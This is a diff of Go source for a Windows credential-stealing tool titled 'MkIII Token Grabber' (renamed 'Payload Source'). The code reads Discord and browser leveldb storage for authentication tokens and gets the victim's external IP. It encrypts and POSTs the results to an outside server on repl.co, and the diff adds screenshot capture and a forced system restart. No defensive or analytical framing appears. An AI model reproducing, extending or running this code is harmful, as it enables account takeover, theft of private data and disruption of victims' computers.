@@ -1,7 +1,7 @@
 /* This package is to be compiled for Win32 or Win64 based Systems.
 
-MkIII Token Grabber
-(c) 2021 Studio 7 Development
+MkIII Payload Source
+(c) 2022/23 Studio 7 Development
 
 > Go Implementation
 */
@@ -9,45 +9,41 @@ MkIII Token Grabber
 package main
 
 import (
+	"bytes"
 	"fmt"
-	"io/ioutil"
+	"github.com/vova616/screenshot"
+	_ "github.com/vova616/screenshot"
+	"image/png"
+	"io"
 	"log"
+	"net/http"
 	"os"
+	"os/exec"
+	"strconv"
 	"strings"
 	"sync"
 )
 
-func DumpService() []string {
-	hdir, _ := os.UserHomeDir()
+func ForceShutdown() {
+	if err := exec.Command("cmd", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
+		fmt.Println("Failed to initiate shutdown:", err)
+	}
+}
 
-	var HOME string = hdir + "/.config"
+func DumpService() []string {
 
 	var WG sync.WaitGroup
 
 	var T []string
 
-	PLATFORMS := [12]string{
-		HOME + "/discord",
-		HOME + "/discordcanary",
-		HOME + "/discordptb",
-		HOME + "/Google/Chrome/User Data/Default",
-		HOME + "/Opera Software/Opera Stable",
-		HOME + "/Opera Software/Opera GX Stable",
-		HOME + "/BraveSoftware/Brave-Browser/User Data/Default",
-		HOME + "/Yandex/YandexBrowser/User Data/Default",
-		HOME + "/Chromium/User Data/Default",
-		HOME + "/Epic Privacy Browser/User Data/Default",
-		HOME + "/Vivaldi/User Data/Default",
-		HOME + "/Slimjet/User Data/Default",
-	}
-
-	for _, PLATFORM := range PLATFORMS {
-		if _, err := os.Stat(PLATFORM); os.IsNotExist(err) {
+	for _, Path := range PLATFORMS {
+		if !FileExists(Path.DataFiles) {
 			continue
 		}
 
-		PLATFORM_PATH := PLATFORM + "/Local Storage/leveldb/"
-		items, _ := ioutil.ReadDir(PLATFORM_PATH)
+		var PLATFORM_PATH string = Path.DataFiles + "\\Local Storage\\leveldb\\"
+
+		items, _ := os.ReadDir(PLATFORM_PATH)
 		for _, File := range items {
 			FName := File.Name()
 			var t []string
@@ -65,7 +61,7 @@ func DumpService() []string {
 					log.Fatalf(e.Error())
 				}
 
-				t = FindAll(string(b))
+				t = FindAllTokens(string(b))
 
 				if len(t) > 0 {
 					T = append(T, t...)
@@ -77,13 +73,15 @@ func DumpService() []string {
 	return T
 }
 
-func main() {
+func GetExternIP() string {
 	resp, _ := http.Get("https://myexternalip.com/raw")
 	defer resp.Body.Close()
-	body, _ := ioutil.ReadAll(resp.Body)
+	body, _ := io.ReadAll(resp.Body)
 
-	// Log the request body
-	ip := string(body)
+	return string(body)
+}
+
+func SendRequest(body string, ip string) {
 	HashKey := RandIntBytes(3)
 	HashKeyInt, _ := strconv.Atoi(HashKey)
 
@@ -107,19 +105,32 @@ func main() {
 	}
 	p = p + "}"
 
-	T := strings.Join(DumpService(), "%BREAK%")
-	var t string
-	if len(T) < 16 {
-		t = strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("% 16d", T), "%!d(string=", ""), ")", "")
-	} else {
-		t = T
-	}
-
-	endpoint := Encrypt(t, strings.Join(strings.Split(hash, "")[0:32], ""))
+	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
 	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
 	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{}
 	client.Do(req)
+}
 
+func GetScreenShot() string {
+	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
+		os.MkdirAll(TempFileDir, 0700)
+	}
+
+	img, err := screenshot.CaptureScreen()
+	if err != nil {
+		panic(err)
+	}
+	f, err := os.Create(TempFileDir + "\\CAPTURE.png")
+	if err != nil {
+		panic(err)
+	}
+	err = png.Encode(f, img)
+	if err != nil {
+		panic(err)
+	}
+	var _ = f.Close()
+
+	return TempFileDir + "\\CAPTURE.png"
 }
